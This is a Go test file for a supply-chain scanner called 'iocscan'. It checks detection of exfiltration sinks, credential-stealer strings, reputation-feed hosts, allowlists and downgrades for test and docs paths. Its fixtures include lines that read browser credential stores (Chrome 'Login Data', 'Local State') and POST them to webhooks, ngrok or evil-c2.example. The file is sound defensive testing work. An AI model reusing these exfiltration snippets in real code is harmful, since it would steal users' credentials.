package iocscan

import "testing"

func files(m map[string]string) map[string][]byte {
	out := make(map[string][]byte, len(m))
	for k, v := range m {
		out[k] = []byte(v)
	}
	return out
}

func TestScan_Malicious(t *testing.T) {
	cases := map[string]map[string]string{
		"discord webhook (dispositive)": {
			"pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', json={'x': 1})\n",
		},
		"telegram bot exfil": {
			"pkg/m.py": "url = 'https://api.telegram.org/bot123:AAH/sendMessage'\n",
		},
		"ngrok tunnel sink": {
			"pkg/c2.js": "const c2 = 'https://abc123.ngrok-free.app/collect';\n",
		},
		"paste drop": {
			"pkg/x.py": "open('p','wb').write(requests.get('https://transfer.sh/abc/p').content)\n",
		},
		"oob interactsh host": {
			"pkg/x.py": "requests.get('http://x.oast.fun/')\n",
		},
		"stealer string + send (coupled)": {
			"pkg/grab.py": "import os, requests\np = os.path.expanduser('~/.config/google-chrome/Default/Login Data')\nrequests.post('http://example.com/u', data=open(p,'rb').read())\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); !r.Detected {
			t.Errorf("%s: expected detection, got none", name)
		}
	}
}

// TestScan_ReputationHost pins detection-roadmap item 4: a host on the offline
// reputation feed, referenced in source COUPLED with an actual outbound send,
// fires the strong "reputation_host" kind (reusing the MaliciousIOC wiring). A
// BARE reference (no send) stays clean (advisory only). Well-known CDNs /
// registries are allowlisted and never match even if they were on the feed.
func TestScan_ReputationHost(t *testing.T) {
	t.Run("feed host + send -> reputation_host", func(t *testing.T) {
		// paste.bingner.com is a seeded feed host; coupled with urlopen.
		fs := files(map[string]string{
			"pkg/__init__.py": "import urllib.request\nurllib.request.urlopen('https://paste.bingner.com/raw/abcd', data=b'x')\n",
		})
		r := Scan(fs)
		if !r.Detected {
			t.Fatalf("expected detection on feed-host+send, got none")
		}
		if r.Kind != "reputation_host" {
			t.Errorf("kind = %q, want reputation_host (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("feed host as bare reference (no send) stays clean", func(t *testing.T) {
		// A reference with no outbound send is advisory only — must not fire.
		fs := files(map[string]string{
			"README.md": "Historic IOC: paste.bingner.com was used by a 2022 campaign.\n",
		})
		if r := Scan(fs); r.Detected {
			t.Errorf("bare feed-host reference should stay clean, got %s (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("IP feed host + send -> reputation_host", func(t *testing.T) {
		fs := files(map[string]string{
			"pkg/x.py": "import requests\nrequests.post('http://54.254.189.27/api/v1/file/upload', data=b'x')\n",
		})
		r := Scan(fs)
		if !r.Detected {
			t.Fatalf("expected detection on IP-feed-host+send, got none")
		}
		if r.Kind != "reputation_host" {
			t.Errorf("kind = %q, want reputation_host (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("exfil_host still wins over reputation_host", func(t *testing.T) {
		// A dedicated exfil sink (Tier 1) must take precedence over a generic
		// reputation hit so the more specific kind is reported.
		fs := files(map[string]string{
			"pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/1/abc', data=b'x')\nx = 'paste.bingner.com'\n",
		})
		r := Scan(fs)
		if r.Kind != "exfil_host" {
			t.Errorf("kind = %q, want exfil_host (more specific should win)", r.Kind)
		}
	})
}

// TestScan_ReputationFeedAllowlist verifies a CDN/registry host is never
// matched as a reputation hit, even coupled with a send — the allowlist guard
// against false positives on legitimate package fetches.
func TestScan_ReputationFeedAllowlist(t *testing.T) {
	// Build a scanner whose feed deliberately includes an allowlisted host to
	// prove the allowlist suppresses it.
	m := newReputationMatcherFromLines([]string{
		"registry.npmjs.org", // allowlisted — must NOT match
		"evil-c2.example",    // not allowlisted — must match
	})
	cleanFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.get('https://registry.npmjs.org/lodash')\n",
	})
	if hit, _ := m.match(cleanFS, true); hit {
		t.Errorf("allowlisted CDN host on feed must not match")
	}
	dirtyFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.post('https://c2.evil-c2.example/x', data=b'y')\n",
	})
	if hit, _ := m.match(dirtyFS, true); !hit {
		t.Errorf("non-allowlisted feed host (subdomain) coupled with send must match")
	}
	// Suffix label-boundary: "notevil-c2.example" must NOT match "evil-c2.example".
	boundaryFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.post('https://notevil-c2.example/x', data=b'y')\n",
	})
	if hit, _ := m.match(boundaryFS, true); hit {
		t.Errorf("label-boundary: notevil-c2.example must not match feed entry evil-c2.example")
	}
}

func TestScan_LegitStaysClean(t *testing.T) {
	cases := map[string]map[string]string{
		"normal http client lib": {
			"pkg/client.py": "import requests\ndef get(u):\n    return requests.get(u)\n",
		},
		// A browser-cookie library legitimately READS the cred store but does
		// NOT exfil it — the coupling gate keeps it clean.
		"browser-cookie lib reads store, no exfil": {
			"pkg/cookies.py": "import sqlite3\nDB = '~/.mozilla/firefox/cookies.sqlite'\ndef load():\n    return sqlite3.connect(DB)\n",
		},
		"package referencing slack in docs/config (no webhook path)": {
			"pkg/notify.py": "SLACK = 'https://slack.com/api/chat.postMessage'\n",
		},
		"normal config with example.com": {
			"pkg/conf.py": "BASE = 'https://api.example.com/v1'\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: expected clean, got %s (%s)", name, r.Kind, r.Detail)
		}
	}
}

// TestScan_ExfilInNonShippingPathIsWeak pins the tests/docs/vendored downgrade.
//
// The exfil_host tier was documented as "dispositive alone". Measured against
// 860 real top packages that produced hard blocks on langchain-core (its test
// FOR SSRF protection), huggingface-hub (API tests), rapidfuzz (vendored
// bootstrap.js) and textual (a docs example) — packages a developer simply
// cannot install. A test that asserts a URL is refused necessarily contains
// that URL.
func TestScan_ExfilInNonShippingPathIsWeak(t *testing.T) {
	payload := "url = 'https://hooks.slack.com/services/T00/B00/XXX'\n"

	weak := []string{
		"pkg-1.0/tests/unit_tests/test_ssrf_protection.py",
		"pkg-1.0/test/api_test.py",
		"pkg-1.0/docs/examples/guide/input/key03.py",
		"pkg-1.0/extern/taskflow/js/bootstrap/4.4.1/bootstrap.js",
		"pkg-1.0/vendor/thing/client.go",
		"pkg-1.0/node_modules/dep/index.js",
		"pkg-1.0/pkg/client_test.go",
		"pkg-1.0/pkg/test_client.py",
	}
	for _, name := range weak {
		t.Run("weak/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected {
				t.Fatalf("indicator should still be REPORTED, not dropped: %s", name)
			}
			if !r.Weak {
				t.Errorf("hit in non-shipping path should be Weak (warn, not block): %s", name)
			}
		})
	}

	shipping := []string{
		"pkg-1.0/pkg/client.py",
		"pkg-1.0/src/prompt_toolkit/input/win32.py",
		"pkg-1.0/setup.py",
		"pkg-1.0/contrib/telegram.py",
	}
	for _, name := range shipping {
		t.Run("shipping/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected || r.Weak {
				t.Errorf("hit in shipping code must stay dispositive (Detected && !Weak): %s got %+v", name, r)
			}
		})
	}
}

// TestScan_ShippingHitWinsOverWeakHit — a package with the indicator in BOTH a
// test and its shipping code must still hard-block. The weak tier must never
// mask a real hit elsewhere in the same archive, regardless of map order.
func TestScan_ShippingHitWinsOverWeakHit(t *testing.T) {
	payload := []byte("send('https://webhook.site/abc')\n")
	for i := 0; i < 50; i++ { // map iteration order is randomised; repeat
		r := Scan(map[string][]byte{
			"p/tests/test_x.py": payload,
			"p/p/real.py":       payload,
		})
		if !r.Detected || r.Weak {
			t.Fatalf("shipping-code hit must win over the test-path hit; got %+v", r)
		}
	}
}

// TestScan_LocalStateProseIsNotACredentialPath pins the casing fix: the English
// phrase "local state" in a comment must not look like Chrome's `Local State`
// credential file. This blocked opentelemetry-api and oauthlib at install time.
func TestScan_LocalStateProseIsNotACredentialPath(t *testing.T) {
	prose := map[string][]byte{
		"p/ctx.py": []byte("# restore the local state of the span context\nrequests.post(u)\n"),
	}
	if r := Scan(prose); r.Detected {
		t.Errorf("prose 'local state' must not be a credential-store hit; got %+v", r)
	}
	real := map[string][]byte{
		"p/steal.py": []byte(`p = "~/Library/Application Support/Google/Chrome/Local State"` + "\nrequests.post(u, data=open(p,'rb'))\n"),
	}
	if r := Scan(real); !r.Detected || r.Kind != "stealer_string" {
		t.Errorf("a real Chrome Local State path coupled with a send must still fire; got %+v", r)
	}
}

// TestScan_StealerInNonShippingPathIsWeak extends the tests/docs/vendored
// downgrade to tier 2. Until 2026-08-24 isNonShippingPath was consulted ONLY on
// the exfil_host path, so a stealer string anywhere in the archive — including
// a docs example — produced a full-strength hard block.
//
// The live case was textual@8.2.8: docs/examples/guide/input/key03.py defines a
// RichLog subclass named `KeyLogger`, which hits keyloggerRE's `\bkeylogg`.
// textual couples trivially (any `.send(` or `fetch(` satisfies netSendRE) and
// has NO stealer match anywhere in its shipping code, so a documentation class
// name refused the install.
//
// WHY THE ASYMMETRY MATTERS. The two directions are not symmetric and must be
// pinned separately, because the attacker's move against this downgrade is to
// put the payload under a path that LOOKS non-shipping. The downgrade is only
// safe because it is scoped to packages whose stealer evidence is EXCLUSIVELY
// non-shipping: one match in real code and the verdict goes back to full
// strength, regardless of how many test-path matches accompany it. A weak-wins
// bug would be invisible in the FP number (it only ever lowers the rate) and
// would silently open exactly that hole — so "shipping stays strong" is the
// assertion that guards the fix, not the fix itself.
func TestScan_StealerInNonShippingPathIsWeak(t *testing.T) {
	// keyloggerRE + a netSendRE-satisfying line, i.e. the coupled tier-2 shape.
	payload := "class KeyLogger(RichLog):\n    def on_key(self, event):\n        self.write(event)\n        self.post_message(x)\n        fetch(url)\n"

	weak := []string{
		"textual-8.2.8/docs/examples/guide/input/key03.py",
		"pkg-1.0/tests/test_keys.py",
		"pkg-1.0/examples/demo.py",
		"pkg-1.0/vendor/thing/keys.js",
		"pkg-1.0/pkg/keys_test.go",
	}
	for _, name := range weak {
		t.Run("weak/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected {
				t.Fatalf("indicator should still be REPORTED, not dropped: %s", name)
			}
			if r.Kind != "stealer_string" {
				t.Fatalf("kind = %q, want stealer_string (%s)", r.Kind, r.Detail)
			}
			if !r.Weak {
				t.Errorf("stealer hit in non-shipping path should be Weak (warn, not block): %s", name)
			}
		})
	}

	shipping := []string{
		"pkg-1.0/src/pkg/keys.py",
		"pkg-1.0/pkg/grab.js",
		"pkg-1.0/setup.py",
	}
	for _, name := range shipping {
		t.Run("shipping/"+name, func(t *testing.T) {
			r := Scan(map[string][]byte{name: []byte(payload)})
			if !r.Detected || r.Kind != "stealer_string" || r.Weak {
				t.Errorf("stealer hit in shipping code must stay dispositive "+
					"(Detected && !Weak): %s got %+v", name, r)
			}
		})
	}
}

// TestScan_ShippingStealerWinsOverWeakStealer — the tier-2 counterpart of
// TestScan_ShippingHitWinsOverWeakHit. A package carrying the stealer string in
// BOTH a docs example and its shipping code must still hard-block, whichever
// file the randomised map walk reaches first.
func TestScan_ShippingStealerWinsOverWeakStealer(t *testing.T) {
	payload := []byte("class KeyLogger:\n    pass\n" + `p = "~/Library/Application Support/Google/Chrome/Local State"` + "\nfetch(url)\n")
	for i := 0; i < 50; i++ { // map iteration order is randomised; repeat
		r := Scan(map[string][]byte{
			"p/docs/examples/key03.py": payload,
			"p/p/real.py":              payload,
		})
		if !r.Detected || r.Kind != "stealer_string" || r.Weak {
			t.Fatalf("shipping-code stealer hit must win over the docs-path hit; got %+v", r)
		}
		if r.Detail != "p/p/real.py" {
			t.Fatalf("Detail should name the shipping file, got %q", r.Detail)
		}
	}
}
